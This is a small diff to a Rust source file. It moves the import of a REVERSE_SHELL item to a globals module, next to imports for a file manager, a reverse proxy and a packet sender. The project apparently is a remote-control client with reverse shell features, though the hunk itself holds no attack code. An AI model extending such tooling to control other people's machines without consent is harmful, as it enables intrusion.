@@ -15,7 +15,7 @@ use crate::features::file_manager::FileManager;
 use crate::features::reverse_proxy::ReverseProxy;
 use common::connection::{ConnectionReader, ConnectionWriter};
 use crate::service::config::get_config;
-use crate::REVERSE_SHELL;
+use crate::globals::REVERSE_SHELL;
 
 static PACKET_SENDER: Lazy<Mutex<Option<mpsc::Sender<ServerboundPacket>>>> = Lazy::new(|| {
     Mutex::new(None)
